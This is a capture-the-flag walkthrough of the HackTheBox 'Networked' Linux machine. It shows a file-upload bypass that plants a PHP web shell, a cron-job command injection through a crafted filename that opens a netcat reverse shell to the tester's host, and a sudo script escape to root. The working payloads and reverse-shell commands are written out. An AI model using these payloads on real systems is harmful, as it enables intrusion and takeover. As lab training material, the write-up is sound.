# Networked
```
Difficulty: Easy
Operating System: Linux
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | `apache` | Unrestricted File Upload & PHP RCE | Discovered an upload form on the website. Analyzed the application's source code from a `backup.tar` file, which revealed file validation weaknesses. By including `GIF8` magic bytes and using a `.php.gif` file extension, I bypassed mime type and extension checks. This misconfiguration, which allowed the web server to execute `.php.*` files as PHP scripts, led to Remote Code Execution (RCE) and a shell as the `apache` user. |
| 2 | `guly` | Cron Job Manipulation & Command Injection | Enumerated the system as `apache` and found a cron job running a PHP script (`check_attack.php`) as the user `guly`. The script checked for improperly named files in the `/uploads/` directory and used `exec()` to delete them. By creating a file named with a command injection payload (`;nc -c bash 10.10.14.24 4445;.php`), I was able to inject and execute a command as `guly` when the cron job ran, gaining a shell as the `guly` user. |
| 3 | `root` | Sudo Misconfiguration & Path Injection | Discovered that the user `guly` could run `/usr/local/sbin/changename.sh` as `root` without a password. Analyzing the script showed that it took user input and echoed it to a file without proper quoting. By providing `test bash` as input for one of the variables, the `echo` command executed `bash` with root privileges, granting a root shell. |



## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
443/tcp closed https
```
Since port 80 is the only obvious path to get into this box, let's dig into it.  
Let's run directory enumeration scans on this host:
```
/uploads              (Status: 301) [Size: 236] [--> http://10.10.10.146/uploads/]
/backup               (Status: 301) [Size: 235] [--> http://10.10.10.146/backup/]
```
we can see the above directories.  
As we hit the site we can see an index.php file opens, so, let's run file enumeration for .php extension  
```
/index.php            (Status: 200) [Size: 229]
/upload.php           (Status: 200) [Size: 169]
/lib.php              (Status: 200) [Size: 0]
```
The upload function shows an upload form.  
Now let's dig into /backup directory.  
Inside here we can find a backup.tar file containing a backup of all the code that is running on the website.

## Foothold
As we can see from the code inside the backup.tar archive there are different validations going on.  
First thing, the application is validating file size and mime type:
```
if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
  echo '<pre>Invalid image file.</pre>';
  displayform();
}
```
The function ```check_file_type()``` checks the file mime type:
```
function check_file_type($file) {
  $mime_type = file_mime_type($file);
  if (strpos($mime_type, 'image/') === 0) {
      return true;
  } else {
      return false;
  }  
}
```
so we need to trick the application and send as file mime-type ```image/*```.
As an additional validation, the application is checking for a valid extension. The uploaded file must have an extension within this list:
```
$validext = array('.jpg', '.png', '.gif', '.jpeg');
```
So again, we need to trick the application and send an *.gif or whatever file.  
Here we have an unproper error handling issue that help us in detecting where we are making miskakes in crafting our payload.  
In fact, in the first case we have the following error message:
```
echo '<pre>Invalid image file.</pre>';
```
If the second validation fails we have the following error instead:
```
echo "<p>Invalid image file</p>";
```
We can see that one comes with the period and the other don't.  
Now, let's test each cases:  
If we send a .php payload since the file has a text mime type, we get ```Invalid image file.```
```
POST /upload.php HTTP/1.1
[... SNIP ...]

-----------------------------52707470211915190551741956971
Content-Disposition: form-data; name="myFile"; filename="exploit.php"
Content-Type: application/x-php

<?php system($_REQUEST['b0d']); ?>

-----------------------------52707470211915190551741956971
Content-Disposition: form-data; name="submit"

go!
-----------------------------52707470211915190551741956971--
```
Instead, if we send a payload with ```GIF8``` magic bytes, the mime type results valid and we get ```Invalid image file```. This means that we fell in the second validation.  
```
POST /upload.php HTTP/1.1
[... SNIP ...]

-----------------------------52707470211915190551741956971
Content-Disposition: form-data; name="myFile"; filename="exploit.php"
Content-Type: application/x-php

GIF8
<?php system($_REQUEST['b0d']); ?>

-----------------------------52707470211915190551741956971
Content-Disposition: form-data; name="submit"

go!
-----------------------------52707470211915190551741956971--
```
now, we need to give the request a valid extension, like .php.gif, hopefully, if the webserver is misconfigured, we will get remote code execution
```
POST /upload.php HTTP/1.1
[... SNIP ...]

-----------------------------52707470211915190551741956971
Content-Disposition: form-data; name="myFile"; filename="exploit.php.gif"
Content-Type: application/x-php

GIF8
<?php system($_REQUEST['b0d']); ?>

-----------------------------52707470211915190551741956971
Content-Disposition: form-data; name="submit"

go!
-----------------------------52707470211915190551741956971--
```
And as a result we get the following message:
```
file uploaded, refresh gallery
```
Now, let's go to photos.php, grab the uploaded file name, go to ```http://10.10.10.146/uploads/10_10_14_24.php.gif?b0d=whoami``` and see if we get code execution:
```
GIF8 apache apache
```
Now that we checked that we have RCE, let's trigger a remote shell
```
root@kali:~/Documents/HTB/Boxes/Networked# nc -lvnp 4444                                                                                                                                                                                    
listening on [any] 4444                          
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.146] 56860                                                                                                                                                                                 
bash: no job control in this shell                                                                                    
bash-4.2$
```

## User
Now that we have a foothold on the box we can look around for directories and interesting files.  
if we navigate to /home/guly/ to grab user.txt we have permission denied. However, in the same directory, we can find interesting files as well:  
```
bash-4.2$ ls
check_attack.php  crontab.guly  user.txt
```
crontab.guly contains the following:  
```
bash-4.2$ cat crontab.guly
*/3 * * * * php /home/guly/check_attack.php
```
Now we can suppose that if we manage hijack execution flow using check_attack.php, we will be able to spawn a shell as guly, since the crontab is installed for this user.  
If we open check_attack.php we can see the following:
```
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
```
Analyzing the code, we can see that the script inspect the content of the directory /var/www/html/uploads/ if the file is not named using the common naming convention (validated by check_ip()) it will do stuff and ```exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");```. Now, since we can manipulate the ```$value``` parameter (because we can write inside /var/www/html/uploads/), we can create a file named as the payload that we want to execute:  
```
bash-4.2$ touch -- ';nc -c bash 10.10.14.24 4445;.php'  
```
the two dashes after touch, tells the command that we are done with the arguments and the only argument we are passing to the command is the actual filename that we want to create.  
The challenge here is to craft a filename containing the payload without slashes, because slashes in files are not allowed.  
once we create the file with the above command, we can listen for the shell to pop up:
```
root@kali:~/Documents/HTB/Boxes/Networked# nc -lvnp 4445                                                                                                                                                                                    
listening on [any] 4445 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.146] 39442
id                                                                                                                    
uid=1000(guly) gid=1000(guly) groups=1000(guly)
```
## Root
Once we log in, following our standard approach, we can run linPEAS looking for possible privilege escalation vectors.    
After we run linPEAS notice that user guly has the following sudo capability:
```
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d                                                                                                                                                                            
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                           
Matching Defaults entries for guly on networked:                                                                      
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLL
ATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:                                                                
    (root) NOPASSWD: /usr/local/sbin/changename.sh         
```
Now, again, we need to analyse another script and see how we can hijack the normal execution flow.  
If we open /usr/local/sbin/changename.sh we can see the following content:
```
[guly@networked ~]$ cat /usr/local/sbin/changename.sh
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done

/sbin/ifup guly0
```
Now, if we inspect the code, we can notice that echo $var=$x is not wrapped in quotes, since $x is written from user input, if we write a space and a command we will be able to execute that command as root.
Here's a simple example of this command escaping
```
[root@kali www ]$ var=test                                                    
[root@kali www ]$ echo $var date  
test date
```
Now we can do the same with the real executable, and hopefully gain a shell as root:
```
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh                                                                                                                                                                                       
interface NAME:                                                                                                                                                                                                                              
tun0
interface PROXY_METHOD:
none
interface BROWSER_ONLY:
none
interface BOOTPROTO:
test bash
[root@networked network-scripts]#
```
And we get a shell as root.

## Forensics
Now let's dig into the reason why we was able to execute a script with a .php.gif extension.  
If we go to /etc/httpd/conf.d/php.conf, we can see the following content:
```
AddHandler php5-script .php
AddType text/html .php
DirectoryIndex index.php
php_value session.save_handler "files"
php_value session.save_path    "/var/lib/php/session"
```
So, the execution happens because instead of heaving ```AddHandler php5-script .php$``` we do not have the dollar sign indicating the line terminator ```AddHandler php5-script .php``` and this misconfiguration tells the webserver to execute as php script ```*.php.*```
